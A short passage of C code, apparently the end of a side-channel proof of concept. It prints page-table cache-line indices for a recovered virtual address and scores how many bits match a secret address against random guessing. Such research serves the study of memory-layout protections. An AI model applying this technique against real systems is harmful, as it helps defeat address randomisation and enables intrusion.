        VPN4_TO_CACHE_LINE(ans.va), 
        VPN3_TO_CACHE_LINE(ans.va), 
        VPN2_TO_CACHE_LINE(ans.va), 
        VPN1_TO_CACHE_LINE(ans.va), 
        PO_TO_CACHE_LINE(ans.va));
    int correct_bits = bit_accuracy_checker(ans.va, (uint64_t)secret); 
    fprintf(stderr, 
            "Correct bits: %d\tImprovement Over Random: %d\n", correct_bits, correct_bits - 32);
}
